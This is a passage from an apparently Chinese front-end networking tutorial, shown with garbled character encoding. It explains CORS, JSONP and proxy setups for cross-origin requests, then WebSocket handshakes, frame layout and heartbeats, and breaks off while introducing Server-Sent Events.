ç‰¹å®šå¤´éƒ¨ï¼ˆå¦‚Accept&#x2F;Content-Type: text&#x2F;plainï¼‰</li><li>æµè§ˆå™¨ç›´æ¥å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨å“åº”ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // å¿…é¡»æŒ‡å®šå…·ä½“åŸŸåæˆ–*<br></code></pre></td></tr></table></figure></li><li>é¢„æ£€è¯·æ±‚ï¼ˆPreflight Requestï¼‰ï¼š<ul><li>è§¦å‘æ¡ä»¶ï¼šå¤æ‚æ“ä½œï¼ˆå¦‚PUT&#x2F;è‡ªå®šä¹‰å¤´éƒ¨&#x2F;Content-Type: application&#x2F;jsonï¼‰</li><li>æµè§ˆå™¨å…ˆå‘OPTIONSè¯·æ±‚ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/api/data</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>PUT<br><span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure><ul><li>æœåŠ¡å™¨å“åº”ç­–ç•¥ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">204</span> No Content<br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>GET, POST, PUT<br><span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br><span class="hljs-attribute">Access-Control-Max-Age</span><span class="hljs-punctuation">: </span>86400  // ç¼“å­˜é¢„æ£€ç»“æœï¼ˆç§’ï¼‰<br></code></pre></td></tr></table></figure></li><li>å¸¦å‡­è¯çš„è¯·æ±‚ï¼š<ul><li>å‰ç«¯è®¾ç½®ï¼šfetch(url, { credentials: â€˜includeâ€™ })</li><li>æœåŠ¡å™¨å“åº”ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://client.com  // ä¸å¯ç”¨*<br><span class="hljs-attribute">Access-Control-Allow-Credentials</span><span class="hljs-punctuation">: </span>true<br></code></pre></td></tr></table></figure></li></ul><p>å‰ç«¯ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å…è®¸è·¨åŸŸçš„æœåŠ¡å™¨å“åº”å¤´</span><br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;https://client.com&#x27;</span>);<br>res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="hljs-string">&#x27;GET, POST&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>SONPï¼ˆJSON with Paddingï¼‰</strong></p><p>åŸç†ï¼š</p><p>åˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹æ€§ï¼Œé€šè¿‡å›è°ƒå‡½æ•°æ¥æ”¶è·¨åŸŸæ•°æ®ã€‚</p><p>å®ç°æ­¥éª¤ï¼š</p><p>ï¼ˆ1ï¼‰å‰ç«¯å®šä¹‰å…¨å±€å›è°ƒå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">data</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received:&#x27;</span>, data);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åŠ¨æ€åˆ›å»º <code>&lt;script&gt;</code> æ ‡ç­¾</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);<br>script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;https://api.example.com/data?callback=handleResponse&#x27;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æœåŠ¡å™¨è¿”å›å‡½æ•°è°ƒç”¨åŒ…è£¹çš„ JSON</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">handleResponse</span>(&#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-attr">data</span>: [...] &#125;);<br></code></pre></td></tr></table></figure><p>å±€é™æ€§ï¼š</p><ul><li>ä»…æ”¯æŒ GET è¯·æ±‚</li><li>æ— é”™è¯¯å¤„ç†æœºåˆ¶ï¼ˆæ— æ³•æ•è·404&#x2F;500ï¼‰</li><li>å­˜åœ¨XSSé£é™©ï¼ˆéœ€ä¿¡ä»»æœåŠ¡å™¨ï¼‰</li></ul><p><strong>ä»£ç†æœåŠ¡å™¨ï¼ˆProxy Serverï¼‰</strong></p><p>åŸç†ï¼š</p><p>å°†è·¨åŸŸè¯·æ±‚è½¬å‘åˆ°åŒæºä»£ç†æœåŠ¡å™¨ï¼Œç”±ä»£ç†è®¿é—®ç›®æ ‡æœåŠ¡ï¼Œé¿å¼€æµè§ˆå™¨åŒæºç­–ç•¥ã€‚</p><p>å®ç°æ–¹å¼ï¼š</p><p>ï¼ˆ1ï¼‰å¼€å‘ç¯å¢ƒä»£ç†</p><p>é€‚ç”¨åœºæ™¯ï¼šå‰ç«¯æœ¬åœ°å¼€å‘è°ƒè¯•</p><p>å®ç°å·¥å…·ï¼šwebpack.devServer</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>,<br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">pathRewrite</span>: &#123; <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ç”Ÿäº§ç¯å¢ƒåå‘ä»£ç†</p><p>é€‚ç”¨åœºæ™¯ï¼šçº¿ä¸Šéƒ¨ç½²</p><p>ä¸»æµæ–¹æ¡ˆï¼šnginx é…ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>  <span class="hljs-attribute">server_name</span> my-domain.com;<br><br>  <span class="hljs-section">location</span> /api/ &#123;<br>    <span class="hljs-attribute">proxy_pass</span> https://api.example.com/;  <span class="hljs-comment"># ç›®æ ‡åœ°å€</span><br>    <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;<br>    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰æ— æœåŠ¡å™¨ä»£ç†</p><p>é€‚ç”¨åœºæ™¯ï¼šæ— éœ€ç»´æŠ¤åŸºç¡€è®¾æ–½</p><p>å®ç°æ–¹æ¡ˆï¼šCloudflare Workers</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(event.<span class="hljs-property">request</span>))<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRequest</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>  url.<span class="hljs-property">hostname</span> = <span class="hljs-string">&#x27;api.example.com&#x27;</span>;  <span class="hljs-comment">// æ›¿æ¢ç›®æ ‡åŸŸå</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(url.<span class="hljs-title function_">toString</span>(), request);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ç¼–ç¨‹å¼ä¸­é—´ä»¶ä»£ç†</p><p>é€‚ç”¨åœºæ™¯ï¼šè‡ªå®šä¹‰ä»£ç†é€»è¾‘</p><p>å®ç°æ–¹å¼ï¼šNode.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; createProxyMiddleware &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http-proxy-middleware&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/external-api&#x27;</span>, <span class="hljs-title function_">createProxyMiddleware</span>(&#123;<br>  <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;https://third-party.com&#x27;</span>,<br>  <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">onProxyReq</span>: <span class="hljs-function">(<span class="hljs-params">proxyReq, req</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// æ·»åŠ è‡ªå®šä¹‰è¯·æ±‚å¤´</span><br>    proxyReq.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;X-Proxy-Source&#x27;</span>, <span class="hljs-string">&#x27;my-server&#x27;</span>);<br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ¡ˆå¯¹æ¯”ä¸é€‰å‹</strong></p><table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">å®‰å…¨æ€§</th><th align="left">å¤æ‚åº¦</th><th align="left">åè®®æ”¯æŒ</th></tr></thead><tbody><tr><td align="left">CORS</td><td align="left">å¯æ§çš„ç¬¬ä¸‰æ–¹API</td><td align="left">â˜…â˜…â˜…</td><td align="left">â˜…â˜…</td><td align="left">å…¨HTTPæ–¹æ³•</td></tr><tr><td align="left">JSONP</td><td align="left">è€æ—§æµè§ˆå™¨å…¼å®¹</td><td align="left">â˜…</td><td align="left">â˜…</td><td align="left">ä»…GET</td></tr><tr><td align="left">ä»£ç†</td><td align="left">æ— æ³•ä¿®æ”¹å“åº”å¤´çš„API</td><td align="left">â˜…â˜…â˜…</td><td align="left">â˜…â˜…â˜…</td><td align="left">å…¨åè®®</td></tr></tbody></table><p><strong>å®‰å…¨é£é™©è§„é¿</strong></p><ul><li>CORSï¼šä¸¥æ ¼è®¾ç½® Access-Control-Allow-Origin ä¸ºå…·ä½“åŸŸåï¼ˆç¦ç”¨*ï¼‰</li><li>JSONPï¼šéªŒè¯è¿”å›æ•°æ® + CSPé˜²æŠ¤</li><li>ä»£ç†ï¼šé™åˆ¶å¯è½¬å‘çš„åŸŸåé˜²æ­¢æ»¥ç”¨</li><li>æ‰€æœ‰æ–¹æ¡ˆå‡éœ€é…åˆHTTPSé˜²æ­¢ä¸­é—´äººæ”»å‡»</li></ul><h2 id="2-2-å®æ—¶é€šä¿¡"><a href="#2-2-å®æ—¶é€šä¿¡" class="headerlink" title="2.2 å®æ—¶é€šä¿¡"></a>2.2 å®æ—¶é€šä¿¡</h2><h3 id="WebSocketåè®®ï¼ˆåŒå‘é€šä¿¡-å¿ƒè·³æ£€æµ‹ï¼‰"><a href="#WebSocketåè®®ï¼ˆåŒå‘é€šä¿¡-å¿ƒè·³æ£€æµ‹ï¼‰" class="headerlink" title="WebSocketåè®®ï¼ˆåŒå‘é€šä¿¡&#x2F;å¿ƒè·³æ£€æµ‹ï¼‰"></a>WebSocketåè®®ï¼ˆåŒå‘é€šä¿¡&#x2F;å¿ƒè·³æ£€æµ‹ï¼‰</h3><p><strong>åŒå‘é€šä¿¡æœºåˆ¶</strong></p><p>åŸºç¡€åŸç†ï¼šåœ¨å•ä¸ªTCPè¿æ¥ä¸Šå»ºç«‹å…¨åŒå·¥é€šä¿¡é€šé“ï¼Œå®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„æŒç»­åŒå‘æ•°æ®æµã€‚</p><p>é“¾æ¥å»ºç«‹æµç¨‹ï¼š</p><p>ï¼ˆ1ï¼‰HTTPæ¡æ‰‹å‡çº§ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/chat</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket          // åè®®å‡çº§å¤´<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Key</span><span class="hljs-punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==  // å®¢æˆ·ç«¯éšæœºå¯†é’¥<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">101</span> Switching Protocols<br><span class="hljs-attribute">Upgrade</span><span class="hljs-punctuation">: </span>websocket<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>Upgrade<br><span class="hljs-attribute">Sec-WebSocket-Accept</span><span class="hljs-punctuation">: </span>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  // æœåŠ¡ç«¯éªŒè¯å“åº”<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åè®®è½¬æ¢</p><ul><li>TCPè¿æ¥ä¿æŒæ‰“å¼€çŠ¶æ€</li><li>é€šä¿¡åè®®ä»HTTPåˆ‡æ¢ä¸ºWebSocketï¼ˆç«¯å£ä¸å˜ï¼Œé»˜è®¤80&#x2F;443ï¼‰</li></ul><p>æ•°æ®å¸§ç»“æ„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0                   1                   2                   3<br>0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>+-+-+-+-+-------+-+-------------+-------------------------------+<br>|F|R|R|R| opcode|M| Payload len |    Extended payload length   |<br>|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |<br>|N|V|V|V|       |S|             |   (if payload len==126/127)   |<br>| |1|2|3|       |K|             |                               |<br>+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +<br>|     Extended payload length continued, if payload len == 127  |<br>+ - - - - - - - - - - - - - - - +-------------------------------+<br>|                               |Masking-key, if MASK set to 1  |<br>+-------------------------------+-------------------------------+<br>| Masking-key (continued)       |          Payload Data         |<br>+-------------------------------- - - - - - - - - - - - - - - - +<br>:                     Payload Data continued ...                :<br>+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +<br>|                     Payload Data continued ...                |<br>+---------------------------------------------------------------+<br></code></pre></td></tr></table></figure><ul><li>opcodeï¼šæ•°æ®ç±»å‹ï¼ˆ1&#x3D;æ–‡æœ¬ï¼Œ2&#x3D;äºŒè¿›åˆ¶ï¼‰</li><li>Payload lenï¼šæ•°æ®é•¿åº¦ï¼ˆæ”¯æŒåˆ†ç‰‡ä¼ è¾“ï¼‰</li><li>Masking-keyï¼šå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯æ•°æ®æ©ç ï¼ˆå®‰å…¨è§„èŒƒï¼‰</li></ul><p><strong>å¿ƒè·³æ£€æµ‹ï¼ˆHeartbeatï¼‰</strong></p><p>æ ¸å¿ƒç›®çš„ï¼š</p><ul><li>æ£€æµ‹è¿æ¥å­˜æ´»çŠ¶æ€</li><li>é˜²æ­¢ä¸­é—´è®¾å¤‡ï¼ˆNAT&#x2F;é˜²ç«å¢™ï¼‰æ–­å¼€â€ç©ºé—²â€è¿æ¥</li></ul><p>å®ç°æœºåˆ¶ï¼š</p><ul><li>å¿ƒè·³åŒ…ï¼šå®šæ—¶å‘é€ç‰¹æ®Šæ§åˆ¶å¸§ï¼ˆPing&#x2F;Pongï¼‰</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æµè§ˆå™¨ç«¯å‘é€Ping</span><br>websocket.<span class="hljs-title function_">ping</span>();<br><br><span class="hljs-comment">// æœåŠ¡ç«¯å“åº”Pongï¼ˆè‡ªåŠ¨å›å¤ï¼‰</span><br>websocket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;ping&#x27;</span>, <span class="hljs-function">() =&gt;</span> websocket.<span class="hljs-title function_">pong</span>());<br></code></pre></td></tr></table></figure><ul><li>å¸§ç±»å‹ï¼š</li></ul><table><thead><tr><th align="left">ç±»å‹</th><th align="left">æ–¹å‘</th><th align="left">è½½è·é•¿åº¦</th></tr></thead><tbody><tr><td align="left">Ping</td><td align="left">å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨</td><td align="left">0-125å­—èŠ‚</td></tr><tr><td align="left">Pong</td><td align="left">æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯</td><td align="left">åŒPing</td></tr></tbody></table><p>é…ç½®å‚æ•°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://example.com&#x27;</span>);<br><span class="hljs-comment">// å¿ƒè·³é—´éš”ï¼ˆå»ºè®®25-30ç§’ï¼Œå°äºNATè¶…æ—¶æ—¶é—´ï¼‰</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (ws.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>    ws.<span class="hljs-title function_">ping</span>();  <span class="hljs-comment">// å‘é€å¿ƒè·³</span><br>  &#125;<br>&#125;, <span class="hljs-number">25000</span>);<br></code></pre></td></tr></table></figure><p>å¼‚å¸¸å¤„ç†ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;close&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">code</span> === <span class="hljs-number">1006</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;è¿æ¥å¼‚å¸¸æ–­å¼€ï¼ˆå¿ƒè·³è¶…æ—¶ï¼‰&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ä¸ä¼ ç»Ÿ HTTP å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">WebSocket</th><th align="left">HTTPè½®è¯¢&#x2F;é•¿è½®è¯¢</th></tr></thead><tbody><tr><td align="left">è¿æ¥æ–¹å¼</td><td align="left">1ä¸ªæŒä¹…TCPè¿æ¥ï¼ˆå…¨åŒå·¥ï¼‰</td><td align="left">å¤šæ¬¡HTTPè¯·æ±‚ï¼ˆåŠåŒå·¥ï¼‰</td></tr><tr><td align="left">å¤´éƒ¨å¼€é”€</td><td align="left">é¦–æ¬¡æ¡æ‰‹åä»…2-14å­—èŠ‚å¸§å¤´</td><td align="left">æ¯æ¬¡è¯·æ±‚å®Œæ•´HTTPå¤´éƒ¨</td></tr><tr><td align="left">å»¶è¿Ÿ</td><td align="left">æ¯«ç§’çº§å®æ—¶æ¨é€</td><td align="left">æ•°ç™¾æ¯«ç§’è‡³ç§’çº§</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">èŠå¤©&#x2F;å®æ—¶æ¸¸æˆ&#x2F;é‡‘èæŠ¥ä»·</td><td align="left">ç®€å•é€šçŸ¥ï¼ˆå…¼å®¹æ€§è¦æ±‚é«˜ï¼‰</td></tr></tbody></table><p><strong>å‰ç«¯å¼€å‘å®è·µ</strong></p><p>ï¼ˆ1ï¼‰æµè§ˆå™¨ API</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://api.example.com/ws&#x27;</span>);<br><br><span class="hljs-comment">// ç›‘å¬æ¶ˆæ¯</span><br>ws.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ”¶åˆ°æ•°æ®:&#x27;</span>, event.<span class="hljs-property">data</span>);<br>&#125;;<br><br><span class="hljs-comment">// å‘é€æ•°æ®</span><br>ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">action</span>: <span class="hljs-string">&#x27;subscribe&#x27;</span>, <span class="hljs-attr">channel</span>: <span class="hljs-string">&#x27;news&#x27;</span> &#125;));<br><br><span class="hljs-comment">// é”™è¯¯å¤„ç†</span><br>ws.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;WebSocketé”™è¯¯:&#x27;</span>, error);<br>&#125;;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å…³é”®ä¼˜åŒ–</p><ul><li>äºŒè¿›åˆ¶ä¼ è¾“</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘é€ArrayBufferæå‡æ€§èƒ½</span><br><span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">128</span>);<br>ws.<span class="hljs-title function_">send</span>(buffer);<br></code></pre></td></tr></table></figure><ul><li>è‡ªåŠ¨é‡è¿</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">ws.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">setTimeout</span>(connect, <span class="hljs-number">3000</span>);<br></code></pre></td></tr></table></figure><ul><li>æµé‡æ§åˆ¶ï¼šç›‘æ§ws.bufferedAmounté¿å…å†…å­˜æº¢å‡º</li></ul><p><strong>åè®®é™åˆ¶</strong></p><ul><li>ä¸æ”¯æŒHTTP&#x2F;2å¤šè·¯å¤ç”¨ï¼ˆéœ€ç‹¬ç«‹è¿æ¥ï¼‰</li><li>ç§»åŠ¨ç½‘ç»œåˆ‡æ¢æ—¶éœ€æ‰‹åŠ¨é‡è¿</li><li>æ—§ç‰ˆä»£ç†å¯èƒ½é˜»æ–­WebSocketæµé‡</li></ul><blockquote><p>ç°ä»£æµè§ˆå™¨æ”¯æŒç‡ï¼šå…¨å±€ &gt; 98%ï¼ˆåŒ…æ‹¬ç§»åŠ¨ç«¯ï¼‰</p></blockquote><h3 id="Server-Sent-Eventsï¼ˆSSEï¼‰åº”ç”¨åœºæ™¯"><a href="#Server-Sent-Eventsï¼ˆSSEï¼‰åº”ç”¨åœºæ™¯" class="headerlink" title="Server-Sent Eventsï¼ˆSSEï¼‰åº”ç”¨åœºæ™¯"></a>Server-Sent Eventsï¼ˆSSEï¼‰åº”ç”¨åœºæ™¯</h3><p><strong>SSE æ ¸å¿ƒç‰¹æ€§</strong></p><p>åè®®æœ¬è´¨ï¼šåŸºäº HTTP çš„å•å‘é€šä¿¡åè®®ï¼Œå…è®¸æœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ–‡æœ¬æ•°æ®ï¼Œä¿æŒé•¿è¿æ¥ã€‚</p><p>æŠ€æœ¯ç‰¹ç‚¹ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">å•å‘é€šä¿¡</td><td align="left">ä»…æœåŠ¡ç«¯â†’å®¢æˆ·ç«¯æ–¹å‘ï¼ˆå¯¹æ¯” WebSocket åŒå‘ï¼‰</td></tr><tr><td align="left">HTTP åŸºç¡€</td><td align="left">ä½¿ç”¨æ ‡å‡† HTTP åè®®ï¼Œæ— é¢å¤–ç«¯å£éœ€æ±‚</td></tr><tr><td align="left">è‡ªåŠ¨é‡è¿</td><td 